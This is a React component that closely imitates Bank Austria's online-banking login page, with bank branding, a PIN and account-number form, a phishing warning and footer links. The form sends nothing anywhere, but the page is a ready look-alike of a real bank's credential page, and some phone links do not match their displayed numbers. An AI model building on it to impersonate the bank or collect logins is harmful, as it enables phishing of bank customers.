import { useState, useEffect, useRef, useCallback } from "react";
import {
  Menu, Wallet, CreditCard, PiggyBank, Home, TrendingUp, BarChart3,
  Shield, Phone, HelpCircle, Cookie, ChevronDown, AlertTriangle, Eye, EyeOff
} from "lucide-react";
import promoBg from "@/assets/bankaustria_promo_bg.jpg";

const BASE_WIDTH = 1200;

const sidebarItems = [
  { icon: Wallet, label: "GIROKONTEN" },
  { icon: CreditCard, label: "KREDITKARTEN" },
  { icon: PiggyBank, label: "SPARPRODUKTE" },
  { icon: Home, label: "FINANZIERUNG" },
  { icon: TrendingUp, label: "WERTPAPIERE" },
  { icon: BarChart3, label: "BÖRSEN & MÄRKTE" },
];

const BankAustria = () => {
  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [showWarning, setShowWarning] = useState(true);
  const [scale, setScale] = useState(1);
  const contentRef = useRef<HTMLDivElement>(null);
  const [contentHeight, setContentHeight] = useState(0);

  const updateScale = useCallback(() => {
    setScale(Math.min(1, window.innerWidth / BASE_WIDTH));
  }, []);

  useEffect(() => {
    updateScale();
    window.addEventListener("resize", updateScale);
    return () => window.removeEventListener("resize", updateScale);
  }, [updateScale]);

  useEffect(() => {
    if (contentRef.current) setContentHeight(contentRef.current.scrollHeight);
  });

  const scaledWidth = BASE_WIDTH * scale;
  const scaledHeight = contentHeight ? contentHeight * scale : undefined;

  return (
    <div
      className="min-h-screen overflow-x-hidden flex justify-center"
      style={{ fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", backgroundColor: "#e8e8e8" }}
    >
      <div style={{ width: `${scaledWidth}px`, height: scaledHeight ? `${scaledHeight}px` : undefined }}>
        <div
          ref={contentRef}
          style={{ width: `${BASE_WIDTH}px`, transform: `scale(${scale})`, transformOrigin: "top left" }}
        >
          {/* Header */}
          <header className="flex items-center justify-between px-5" style={{ backgroundColor: "#c80a1e", height: "80px" }}>
            <div className="flex items-center gap-4">
              <button className="text-white"><Menu size={28} /></button>
              <div className="flex flex-col">
                <span className="text-white font-bold text-xl tracking-wide">Bank Austria</span>
                <span className="text-white/70 text-[10px] tracking-wider">Member of UniCredit</span>
              </div>
            </div>
            <nav className="flex items-center gap-6">
              {["Privatkunden", "Firmenkunden", "Private Banking", "Über uns"].map((item) => (
                <a key={item} href="#" className="text-white/80 hover:text-white text-sm font-medium transition-colors">
                  {item}
                </a>
              ))}
            </nav>
          </header>

          {/* Body: Sidebar + Main */}
          <div className="flex" style={{ backgroundColor: "#fff" }}>
            {/* Sidebar */}
            <aside className="flex flex-col" style={{ width: "80px", backgroundColor: "#1a1a1a", minHeight: "600px" }}>
              {sidebarItems.map(({ icon: Icon, label }) => (
                <a
                  key={label}
                  href="#"
                  className="flex flex-col items-center justify-center py-3 border-l-[3px] border-transparent hover:border-white transition-colors group"
                  style={{ height: "80px", borderBottom: "1px solid rgba(102,102,102,0.16)" }}
                >
                  <Icon size={22} className="text-[#bebebe] group-hover:text-white transition-colors" />
                  <span className="text-[#bebebe] group-hover:text-white text-[9px] text-center mt-1 leading-tight uppercase font-medium transition-colors">
                    {label}
                  </span>
                </a>
              ))}
            </aside>

            {/* Main Content */}
            <main className="flex-1 px-10 py-8">
              {/* 24You */}
              <div className="mb-6">
                <span className="text-4xl font-light" style={{ color: "#c80a1e" }}>24</span>
                <span className="text-4xl font-light" style={{ color: "#00aed0" }}>You</span>
              </div>

              {/* Warning Box */}
              {showWarning && (
                <div className="mb-8 p-5 rounded" style={{ backgroundColor: "#fff3cd", border: "1px solid #ffc107" }}>
                  <div className="flex items-start gap-3">
                    <AlertTriangle size={20} className="mt-0.5 flex-shrink-0" style={{ color: "#856404" }} />
                    <div className="text-sm" style={{ color: "#856404" }}>
                      <p className="font-semibold mb-2">
                        Warnung: Derzeit versenden Betrüger Phishing-Mails bei denen Ihnen eine Login-Aufforderung der Bank Austria vorgegaukelt wird.
                      </p>
                      <p className="mb-2">
                        Folgen Sie keinen Login-Links, die Sie per E-Mail oder per SMS erhalten! Bitte lesen Sie vor der Eingabe einer TAN den Text der gesamten TAN-Nachricht sorgfältig!
                      </p>
                      <p>
                        Sie befürchten, Opfer dieses Betruges zu sein? Rufen Sie zu Ihrer eigenen Sicherheit umgehend das Bank Austria Sicherheitscenter unter der Rufnummer{" "}
                        <strong>050505-26105</strong> an.
                      </p>
                    </div>
                  </div>
                </div>
              )}

              {/* Login Form */}
              <div className="max-w-md mx-auto">
                <div className="mb-4">
                  <a href="#" className="text-sm hover:underline" style={{ color: "#00aed0" }}>
                    PIN vergessen oder Verfügernummer gesperrt?
                  </a>
                </div>

                <div className="mb-4">
                  <input
                    type="text"
                    value={verfueger}
                    onChange={(e) => setVerfueger(e.target.value)}
                    placeholder="Verfügernummer"
                    className="w-full px-4 py-3 text-base outline-none rounded-sm"
                    style={{ border: "2px solid #00aed0" }}
                  />
                </div>

                <div className="mb-4 relative">
                  <input
                    type={showPin ? "text" : "password"}
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    placeholder="PIN"
                    className="w-full px-4 py-3 text-base outline-none rounded-sm pr-12"
                    style={{ border: "2px solid #00aed0" }}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPin(!showPin)}
                    className="absolute right-3 top-1/2 -translate-y-1/2"
                    style={{ color: "#00aed0" }}
                  >
                    {showPin ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>

                <button
                  className="w-full py-3 text-white font-semibold text-base rounded-sm hover:opacity-90 transition-opacity"
                  style={{ backgroundColor: "#00aed0" }}
                >
                  LOGIN
                </button>

                <div className="mt-6 flex items-center justify-between">
                  <div>
                    <span className="text-sm font-semibold" style={{ color: "#c80a1e" }}>
                      Gefälschte Bank Austria Mails im Umlauf!
                    </span>
                    <button
                      onClick={() => setShowWarning(!showWarning)}
                      className="ml-2 text-sm hover:underline"
                      style={{ color: "#00aed0" }}
                    >
                      Details {showWarning ? "ausblenden" : "anzeigen"}
                    </button>
                  </div>
                </div>

                <div className="mt-4 flex items-center gap-4">
                  <button className="flex items-center gap-1 text-sm font-semibold" style={{ color: "#333" }}>
                    <span className="text-base">🇦🇹</span> Deutsch
                  </button>
                  <button className="flex items-center gap-1 text-sm" style={{ color: "#999" }}>
                    <span className="text-base">🇬🇧</span> English
                  </button>
                </div>
              </div>
            </main>
          </div>

          {/* Promo Banner */}
          <div
            className="relative w-full flex items-center"
            style={{
              backgroundImage: `url(${promoBg})`,
              backgroundSize: "cover",
              backgroundPosition: "center",
              height: "300px",
            }}
          >
            <div className="absolute inset-0" style={{ backgroundColor: "rgba(0,0,0,0.35)" }} />
            <div className="relative z-10 px-12 max-w-xl">
              <p className="text-white text-3xl font-light mb-2">Lässt sich einrichten</p>
              <p className="text-white text-base mb-4">
                Jetzt von Topkonditionen* unserer Wohnoffensive<br />profitieren.
              </p>
              <a
                href="https://www.bankaustria.at/wohnoffensive"
                target="_blank"
                rel="noopener noreferrer"
                className="inline-block px-6 py-2.5 text-white font-semibold text-sm tracking-wider hover:opacity-90 transition-opacity"
                style={{ backgroundColor: "#00aed0" }}
              >
                MEHR ERFAHREN
              </a>
            </div>
          </div>
          <div className="px-10 py-2 text-[10px]" style={{ backgroundColor: "#e8e8e8", color: "#666" }}>
            *Exklusiv für neue oder bestehende Bank Austria Girokontokund:innen – vorbehaltlich positiver Kreditentscheidung. Aktionsbedingungen unter bankaustria/wohnoffensive.jsp
          </div>

          {/* Footer Icons */}
          <div className="flex justify-center gap-8 py-8" style={{ backgroundColor: "#f5f5f5" }}>
            {[
              { icon: Shield, label: "Sicherheits\ninformationen", href: "https://www.bankaustria.at/sicherheit" },
              { icon: Phone, label: "Sicherheitscenter\n+43 (0) 50505 26105", href: "tel:+43505052610" },
              { icon: Phone, label: "Internetbanking Hotline\n+43 (0) 50505 26100", href: "tel:+4350505261005" },
              { icon: HelpCircle, label: "FAQ", href: "https://www.bankaustria.at/faq" },
              { icon: Cookie, label: "Cookie Policy", href: "https://www.bankaustria.at/cookie-policy" },
            ].map(({ icon: Icon, label, href }) => (
              <a
                key={label}
                href={href}
                target="_blank"
                rel="noopener noreferrer"
                className="flex flex-col items-center gap-2 hover:opacity-70 transition-opacity"
                style={{ color: "#00aed0" }}
              >
                <Icon size={28} />
                <span className="text-xs text-center whitespace-pre-line" style={{ color: "#333" }}>
                  {label}
                </span>
              </a>
            ))}
          </div>

          {/* Footer */}
          <footer className="px-10 py-6" style={{ backgroundColor: "#333", color: "#aaa" }}>
            <div className="flex items-center justify-between mb-3">
              <div className="flex items-center gap-4 text-sm">
                <span className="text-white font-medium">UniCredit Bank Austria AG</span>
                <a href="https://www.bankaustria.at/impressum" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Impressum</a>
                <a href="https://www.bankaustria.at/agb" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">AGB</a>
                <a href="https://www.bankaustria.at/datenschutz" target="_blank" rel="noopener noreferrer" className="hover:text-white transition-colors">Datenschutzerklärung</a>
              </div>
            </div>
            <div className="flex items-center justify-between">
              <span className="text-xs">© 2026 UniCredit Bank Austria AG</span>
              <span className="text-white font-bold text-sm tracking-wider">UniCredit</span>
            </div>
          </footer>
        </div>
      </div>
    </div>
  );
};

export default BankAustria;
